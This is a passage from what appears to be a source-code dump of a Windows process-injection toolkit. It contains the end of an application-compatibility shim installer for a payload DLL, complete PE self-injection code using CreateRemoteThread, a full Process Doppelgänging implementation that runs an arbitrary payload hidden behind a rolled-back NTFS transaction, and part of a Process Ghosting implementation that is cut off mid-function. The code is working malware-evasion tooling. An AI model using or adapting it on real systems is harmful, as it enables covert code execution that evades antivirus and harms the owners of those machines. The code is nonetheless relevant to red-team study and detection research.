    SdbEndWriteListTag = (fnSdbEndWriteListTag)GetProcAddress(appHelpDllHandle, "SdbEndWriteListTag");
    SdbWriteBinaryTag = (fnSdbWriteBinaryTag)GetProcAddress(appHelpDllHandle, "SdbWriteBinaryTag");
    SdbWriteDWORDTag = (fnSdbWriteDWORDTag)GetProcAddress(appHelpDllHandle, "SdbWriteDWORDTag");
    SdbWriteStringTag = (fnSdbWriteStringTag)GetProcAddress(appHelpDllHandle, "SdbWriteStringTag");
    SdbWriteNULLTag = (fnSdbWriteNULLTag)GetProcAddress(appHelpDllHandle, "SdbWriteNULLTag");

    if (!SdbBeginWriteListTag || !SdbCloseDatabaseWrite || !SdbCreateDatabase || !SdbEndWriteListTag || 
        !SdbWriteBinaryTag || !SdbWriteDWORDTag || !SdbWriteStringTag || !SdbWriteNULLTag)
    {
        printf("[Error] %d - Failed to resolve a Sdb function in apphelp.dll\n", GetLastError());
        return 1;
    }

    if (!CreateApplicationCompatibilityDatabase(processNameW, payloadDllW))
    {
        printf("[Error] - Failed to create compatibility patch database\n");
        return 1;
    }
    return 0;
}
```

`pe_injection/pe_inject.cpp`:

```cpp
/**
* Demonstrates PE injection by injecting itself into another process.
* Supports 32- and 64 Bit applications.
*/

#include <stdio.h>
#include <Windows.h>
#include <cstdint>
#include <tlhelp32.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


void InjectedFunction()
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
}

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	printf("[Info] - My ProcessId %d\n", GetCurrentProcessId());

	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("Error %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("Error - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	HMODULE baseAddress = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((int8_t*)baseAddress + dosHeader->e_lfanew);

	int8_t* imageCopy = (int8_t*)malloc(ntHeader->OptionalHeader.SizeOfImage);
	if (!imageCopy)
	{
		printf("[Error] %d - Failed to allocate space for the PE header\n", GetLastError());
		return 1;
	}

	// copy original image
	memcpy(imageCopy, baseAddress, ntHeader->OptionalHeader.SizeOfImage);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// calculate the difference between the original base address and the remote memory as we need to account for it when relocating
	int64_t baseAddressDelta = (int64_t)remoteMemory - (int64_t)baseAddress;

	printf("[Info] - Image baseAddress: %p, remoteAddress: %p, absoluteDelta: %llx\n", baseAddress, remoteMemory, abs(baseAddressDelta));

	// relocate the copy of the image
	PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(imageCopy + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	while (baseRelocation->SizeOfBlock > 0)
	{
		// calculate relocation entries in current block
		int numberOfEntries = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		PBASE_RELOCATION_ENTRY relocationEntry = (PBASE_RELOCATION_ENTRY)(baseRelocation + 1);

		// relocate entries of current block
		for (int i = 0; i < numberOfEntries; i++)
		{
			if (relocationEntry[i].Offset)
			{
				// correct relocation entry by adding the delta between the images
				int64_t* relocationEntryAddress = (int64_t*)(imageCopy + baseRelocation->VirtualAddress + relocationEntry[i].Offset);
				*relocationEntryAddress += baseAddressDelta;
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((int8_t*)baseRelocation + baseRelocation->SizeOfBlock);
	}

	printf("[Info] - Relocated image\n");

	// write relocated copy of image to remote memory
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, imageCopy, ntHeader->OptionalHeader.SizeOfImage, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote image to remote process\n");

	// execute the injected function
	int8_t* injectedFunctionRemoteAddress = (int8_t*)InjectedFunction + baseAddressDelta;

	printf("[Info] - Going to execute: %p\n", injectedFunctionRemoteAddress);

	//printf("Press a key to create the remote thread!\n");
	//getchar();

	HANDLE remoteThreadHandle = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)injectedFunctionRemoteAddress, NULL, 0, NULL);
	if (!remoteThreadHandle)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", injectedFunctionRemoteAddress);

	return 0;
}
```

`pe_injection/process_doppelganging.cpp`:

```cpp
/**
* Process Doppelgänging - Inject code into a process by creating a malicious section that is backed by a legit file by abusing NTFS transactions.
* Supports 32- and 64 Bit applications. The 64 bit implementation currently does not support copying the environment in the remote process.
* No support for Windows 10 since a Windows Defender drivers prevents the thread from executing even with Windows Defender disabled.
* No support for WoW64. Technically possible but using low level API with WoW64 is complicated. One has for example to deal with 2 PEBs.
* Based on: https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf
*/

#include <Windows.h>
#include <iostream>
#include <KtmW32.h>
#include <userenv.h>

#include "ntddk.h"


#define PS_INHERIT_HANDLES 4
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001

using fnNtCreateProcessEx = NTSTATUS(NTAPI*)(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ParentProcess,
	_In_ ULONG Flags,
	_In_opt_ HANDLE SectionHandle,
	_In_opt_ HANDLE DebugPort,
	_In_opt_ HANDLE ExceptionPort,
	_In_ ULONG JobMemberLevel
	);

using fnNtCreateThreadEx = NTSTATUS(NTAPI*) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	);

using fnRtlCreateProcessParametersEx = NTSTATUS(NTAPI*)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags
	);

fnNtCreateProcessEx NtCreateProcessEx;
fnNtCreateThreadEx NtCreateThreadEx;
fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx;

int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfCleanFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// create transaction to be rolled back later
	HANDLE transaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
	if (transaction == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateTransaction\n", GetLastError());
		return nullptr;
	}

	// open a clean file transacted
	HANDLE transactedFile = CreateFileTransacted("svchost.exe",
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		transaction,
		nullptr,
		nullptr
	);
	if (transactedFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateFileTransacted\n", GetLastError());
		return nullptr;
	}

	// overwrite file with malicious payload
	DWORD numberOfBytesWritten;
	if (!WriteFile(transactedFile, payloadBuffer, payloadSize, &numberOfBytesWritten, nullptr))
	{
		printf("[Error] %d - Failed to WriteFile\n", GetLastError());
		return nullptr;
	}

	// create a dirty section
	HANDLE section = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, transactedFile)))
	{
		printf("[Error] - Failed to NtCreateSection for malicious executable\n");
		return nullptr;
	}
	CloseHandle(transactedFile);

	// rollback transaction so file system is clean again while we still have a dirty section
	if (!RollbackTransaction(transaction))
	{
		printf("[Error] %d - Failed to RollbackTransaction\n", GetLastError());
		return nullptr;
	}
	CloseHandle(transaction);
	return section;
}

LPVOID WriteParametersIntoRemoteProcess(HANDLE processHandle, PRTL_USER_PROCESS_PARAMETERS processParameters)
{
	// determine which local address is lower so we can copy the parameters to a single page
	PVOID bufferStart = processParameters < processParameters->Environment ? processParameters : processParameters->Environment;
	PVOID bufferEnd = processParameters < processParameters->Environment ? (int8_t*)processParameters + processParameters->Length : (int8_t*)processParameters->Environment + processParameters->EnvironmentSize;
	DWORD_PTR bufferSize = (DWORD_PTR)bufferEnd - (DWORD_PTR)bufferStart;

	PVOID remoteMemory = VirtualAllocEx(processHandle, bufferStart, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to VirtualAllocEx at address %p\n", GetLastError(), bufferStart);
		return nullptr;
	}

	if (!WriteProcessMemory(processHandle, processParameters, processParameters, processParameters->Length, nullptr))
	{
		printf("[Error] %d - Failed to write PRTL_USER_PROCESS_PARAMETERS to remote process\n", GetLastError());
		return nullptr;
	}

#ifdef _WIN64
	printf("[Warning] - The current x64 implemenation does not support copying the environment since writing the environment to the remote process fails\n");
#else
	if (processParameters->Environment)
	{
		if (!WriteProcessMemory(processHandle, processParameters->Environment, processParameters->Environment, processParameters->EnvironmentSize, nullptr))
		{
			printf("[Error] %d - Failed to write environment to remote process\n", GetLastError());
			return nullptr;
		}
	}
#endif
	return processParameters;
}

bool SetupProcessParameters(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation, char* targetPath)
{
	// initialise process parameters
	ANSI_STRING targetPathAnsi;
	UNICODE_STRING targetPathUni;
	UNICODE_STRING uWindowName;
	UNICODE_STRING dllPathUni;
	UNICODE_STRING currentDirectoryPathUni;

	wchar_t dllPath[] = L"C:\\Windows\\System32";
	wchar_t windowName[] = L"Process Doppelganging";
	wchar_t currentDirectoryPath[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, currentDirectoryPath);

	RtlInitUnicodeString(&uWindowName, windowName);
	RtlInitUnicodeString(&currentDirectoryPathUni, currentDirectoryPath);
	RtlInitUnicodeString(&dllPathUni, dllPath);
	RtlInitAnsiString(&targetPathAnsi, targetPath);
	RtlAnsiStringToUnicodeString(&targetPathUni, &targetPathAnsi, TRUE);

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS processParameters = nullptr;
	if (!NT_SUCCESS(RtlCreateProcessParametersEx(&processParameters, &targetPathUni, &dllPathUni, &currentDirectoryPathUni, &targetPathUni, environment, &uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED)))
	{
		printf("[Error] - Failed to RtlCreateProcessParametersEx\n");
		return false;
	}

	// write process parameters into the remote process
	LPVOID remoteProcessParameters = WriteParametersIntoRemoteProcess(processHandle, processParameters);
	if (!remoteProcessParameters)
	{
		printf("[Error] - Failed to write process parameters into remote process\n");
		return false;
	}

	int8_t* remoteProcessParameterAddress = (int8_t*)processBasicInformation.PebBaseAddress + offsetof(PEB, ProcessParameters);

	// update pointer to process parameters in remote PEB
	if (!WriteProcessMemory(processHandle, remoteProcessParameterAddress, &remoteProcessParameters, sizeof(PVOID), nullptr))
	{
		printf("[Error] %d - Failed to write process parameters into remote PEB\n", GetLastError());
		return false;
	}

	return true;
}

int8_t* ReadEntryPointOfRemoteProcess(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation)
{
	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	int8_t* processBasesAddress = 0;
	if (!ReadProcessMemory(processHandle, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		return nullptr;
	}

	printf("[Info] - Remote base address %p\n", processBasesAddress);

	// read PE headers
	const int numberOfBytesToRead = 4096;
	int8_t peBuffer[numberOfBytesToRead] = {};
	if (!ReadProcessMemory(processHandle, processBasesAddress, peBuffer, numberOfBytesToRead, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		return nullptr;
	}

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
	int8_t* entryPoint = (int8_t*)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)processBasesAddress);
	printf("[Info] - Remote entry point %p\n", entryPoint);
	return entryPoint;
}


bool Doppelgang(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
{
	// create a dirty section of a file that is clean on disc
	HANDLE dirtySectionHandle = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
	if (!dirtySectionHandle)
	{
		return false;
	}

	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);

	// create a process using the dirty section
	HANDLE processHandle = nullptr;
	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySectionHandle, NULL, NULL, FALSE)))
	{
		printf("[Error] - Failed to NtCreateProcessEx using dirty section");
		return false;
	}

	DWORD returnLength = 0;
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return false;
	}
	PVOID remoteEntryPoint = ReadEntryPointOfRemoteProcess(processHandle, processBasicInformation);
	if (!remoteEntryPoint)
	{
		printf("[Error] - Failed to ReadEntryPointOfRemoteProcess\n");
		return false;
	}

	printf("[Info] - Read entry point of remote of remote process %p\n", remoteEntryPoint);

	if (!SetupProcessParameters(processHandle, processBasicInformation, targetPath))
	{
		printf("[Error] - Failed to SetupProcessParameters\n");
		return false;
	}

	HANDLE threadHandle = NULL;
	if (!NT_SUCCESS(NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, FALSE, 0, 0, 0, NULL)))
	{
		printf("[Error] - Failed to NtCreateThreadEx\n");
		return false;
	}

	printf("[Info] - Created thread executing %p\n", remoteEntryPoint);
	return true;
}


int main(int argc, char* argv[])
{
	char* targetPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = argv[1];

	if (argc < 2)
	{
		printf("Usage: *.exe executablePayloadPath\n");
	}

	HMODULE ntdllHandle = LoadLibraryA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] - Failed to LoadLibraryA ntdll\n");
		return 1;
	}
	NtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(ntdllHandle, "NtCreateProcessEx");
	NtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");
	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(ntdllHandle, "RtlCreateProcessParametersEx");

	if (!RtlCreateProcessParametersEx || !NtCreateProcessEx || !NtCreateThreadEx)
	{
		printf("[Error] - Failed to resolve NtCreateProcessEx, NtCreateThreadEx or RtlCreateProcessParametersEx\n");
		return 1;
	}

	DWORD payloadSize = 0;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	if (!Doppelgang(targetPath, payloadBuffer, payloadSize))
	{
		printf("[Error] - Failed process doppelganging\n");
		return 1;
	}

	// cleanup
	VirtualFree(payloadBuffer, 0, MEM_RELEASE);
	return 0;
}
```

`pe_injection/process_ghosting.cpp`:

```cpp
/**
* Process Ghosting - Inject code into a process by creating a malicious section using a delete pending file.
* Supports 32- and 64 Bit applications. The 64 bit implementation currently does not support copying the environment in the remote process.
* No support for WoW64. Technically possible but using low level API with WoW64 is complicated. One has for example to deal with 2 PEBs.
* Based on: https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack, https://github.com/hasherezade/process_ghosting
*/

#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <userenv.h>

#include "ntddk.h"

#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define PS_INHERIT_HANDLES 4

using fnNtCreateProcessEx = NTSTATUS(NTAPI*)(
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ParentProcess,
	_In_ ULONG Flags,
	_In_opt_ HANDLE SectionHandle,
	_In_opt_ HANDLE DebugPort,
	_In_opt_ HANDLE ExceptionPort,
	_In_ ULONG JobMemberLevel
	);

using fnNtCreateThreadEx = NTSTATUS(NTAPI*) (
	OUT  PHANDLE ThreadHandle,
	IN  ACCESS_MASK DesiredAccess,
	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN  HANDLE ProcessHandle,
	IN  PVOID StartRoutine,
	IN  PVOID Argument OPTIONAL,
	IN  ULONG CreateFlags,
	IN  ULONG_PTR ZeroBits,
	IN  SIZE_T StackSize OPTIONAL,
	IN  SIZE_T MaximumStackSize OPTIONAL,
	IN  PVOID AttributeList OPTIONAL
	);

using fnRtlCreateProcessParametersEx = NTSTATUS(NTAPI*)(
	_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	_In_ PUNICODE_STRING ImagePathName,
	_In_opt_ PUNICODE_STRING DllPath,
	_In_opt_ PUNICODE_STRING CurrentDirectory,
	_In_opt_ PUNICODE_STRING CommandLine,
	_In_opt_ PVOID Environment,
	_In_opt_ PUNICODE_STRING WindowTitle,
	_In_opt_ PUNICODE_STRING DesktopInfo,
	_In_opt_ PUNICODE_STRING ShellInfo,
	_In_opt_ PUNICODE_STRING RuntimeData,
	_In_ ULONG Flags
	);

fnNtCreateProcessEx NtCreateProcessEx;
fnNtCreateThreadEx NtCreateThreadEx;
fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx;

int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfDeletePendingFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// get a temporary file. It only matters that it exists and we can open it (no shared conflict etc.)
	wchar_t tempFileName[MAX_PATH];
	wchar_t tempFilePath[MAX_PATH];
	GetTempPathW(MAX_PATH, tempFilePath);
	GetTempFileNameW(tempFilePath, L"fhs", 0, tempFileName);

	std::wstring ntTempFileName = L"\\??\\" + std::wstring(tempFileName);
	UNICODE_STRING tempFileNameUni;
	RtlInitUnicodeString(&tempFileNameUni, ntTempFileName.c_str());

	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &tempFileNameUni, NULL, NULL, NULL);

	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE deletePendingFileHandle = INVALID_HANDLE_VALUE;
	if (!NT_SUCCESS(NtOpenFile(&deletePendingFileHandle,
		DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
		&objectAttributes,
		&ioStatusBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
	)))
	{
		printf("[Error] - Failed to open temporary file\n");
		return nullptr;
	}

	// set delete flag which will delete the file as soon as its closed
	FILE_DISPOSITION_INFORMATION fileDispositionInformation = {};
	fileDispositionInformation.DeleteFile = true;
	if (!NT_SUCCESS(NtSetInformationFile(deletePendingFileHandle, &ioStatusBlock, &fileDispositionInformation, sizeof(fileDispositionInformation), FileDispositionInformation)))
	{
		printf("[Error] - Failed to set delete flag on file using NtSetInformationFile\n");
		return nullptr;
	}

	printf("[Info] - Set delete flag on temporary file\n");

	// overwrite content of delete pending file with payload
	LARGE_INTEGER byteOffset = {};
	if (!NT_SUCCESS(NtWriteFile(deletePendingFileHandle, NULL, NULL, NULL, &ioStatusBlock, payloadBuffer, payloadSize, &byteOffset, NULL)))
	{
		printf("[Error] - Failed to write payload into delete pending file\n");
		return nullptr;
	}

	printf("[Info] - Wrote payload to delete pending file\n");
	
	HANDLE dirtySection = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&dirtySection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, deletePendingFileHandle)))
	{
		printf("[Error] - Failed to create dirty section of delete pending file\n");
		return nullptr;
	}
	
	printf("[Info] - Created dirty section of delete pending file\n");

	// this indirectly deletes the file due to the delete flag
	NtClose(deletePendingFileHandle);

	return dirtySection;
}

LPVOID WriteParametersIntoRemoteProcess(HANDLE processHandle, PRTL_USER_PROCESS_PARAMETERS processParameters)
{
	// determine which local address is lower so we can copy the parameters to a single page
	PVOID bufferStart = processParameters < processParameters->Environment ? processParameters : processParameters->Environment;
	PVOID bufferEnd = processParameters < processParameters->Environment ? (int8_t*)processParameters + processParameters->Length : (int8_t*)processParameters->Environment + processParameters->EnvironmentSize;
	DWORD_PTR bufferSize = (DWORD_PTR)bufferEnd - (DWORD_PTR)bufferStart;

	PVOID remoteMemory = VirtualAllocEx(processHandle, bufferStart, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to VirtualAllocEx at address %p\n", GetLastError(), bufferStart);
		return nullptr;
	}

	if (!WriteProcessMemory(processHandle, processParameters, processParameters, processParameters->Length, nullptr))
	{
		printf("[Error] %d - Failed to write PRTL_USER_PROCESS_PARAMETERS to remote process\n", GetLastError());
		return nullptr;
	}

#ifdef _WIN64
	printf("[Warning] - The current x64 implemenation does not support copying the environment since writing the environment to the remote process fails\n");
#else
	if (processParameters->Environment)
	{
		if (!WriteProcessMemory(processHandle, processParameters->Environment, processParameters->Environment, processParameters->EnvironmentSize, nullptr))
		{
			printf("[Error] %d - Failed to write environment to remote process\n", GetLastError());
			return nullptr;
		}
	}
#endif
	return processParameters;
}

bool SetupProcessParameters(HANDLE processHandle, PROCESS_BASIC_INFORMATION& processBasicInformation, char* targetPath)
{
	// initialise process parameters
	ANSI_STRING targetPathAnsi;
	UNICODE_STRING targetPathUni;
	UNICODE_STRING uWindowName;
	UNICODE_STRING dllPathUni;
	UNICODE_STRING currentDirectoryPathUni;

	wchar_t dllPath[] = L"C:\\Windows\\System32";
	wchar_t windowName[] = L"Process Ghosting";
	wchar_t currentDirectoryPath[MAX_PATH];
	GetCurrentDirectoryW(MAX_PATH, currentDirectoryPath);

	RtlInitUnicodeString(&uWindowName, windowName);
	RtlInitUnicodeString(&currentDirectoryPathUni, currentDirectoryPath);
	RtlInitUnicodeString(&dllPathUni, dllPath);
	RtlInitAnsiString(&targetPathAnsi, targetPath);
	RtlAnsiStringToUnicodeString(&targetPathUni, &targetPathAnsi, TRUE);

	LPVOID environment;
	CreateEnvironmentBlock(&environment, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS processParameters = nullptr;
	if (!NT_SUCCESS(RtlCreateProcessParametersEx(&processParameters, &targetPathUni, &dllPathUni, &currentDirectoryPathUni, &targetPathUni, environment, &uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED)))
	{
		printf("[Error] - Failed to RtlCreateProcessParametersEx\n");
		return false;
	}

	// write process parameters into the remote process
	LPVOID remoteProcessParameters = WriteParametersIntoRemoteProcess(processHandle, processParameters);
	if (!remoteProcessParameters)
	{
		printf("[Error] - Failed to write process parameters into remote process\n");
		return false;
	}

	int8_t* remoteProcessParameterAddress = (int8_t*)processBasicInformation.PebBaseAddress + offsetof(PEB, ProcessParameters);

	// update pointer to process parameters in remote PEB
	if (!WriteProcessMemory(processHandle, remoteProcessParameterAddress, &remoteProcessParameters, sizeof(PVOID), nullptr))
	{
		printf("[Error] %d - Failed to write process parameters into remote PEB\n", GetLastError());
		return false;
	}

	return true;
}

bool Ghost(char* targetPath, int8_t* payloadBuffer, DWORD payloadSize)
{
	HANDLE dirtySectionHandle = CreateDirtySectionOfDeletePendingFile(payloadBuffer, payloadSize);
	if (!dirtySectionHandle) 
	{
		printf("[Error] - Failed to create dirty section from delete pending file\n");
		return false;
	}

	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);

	HANDLE processHandle = nullptr;
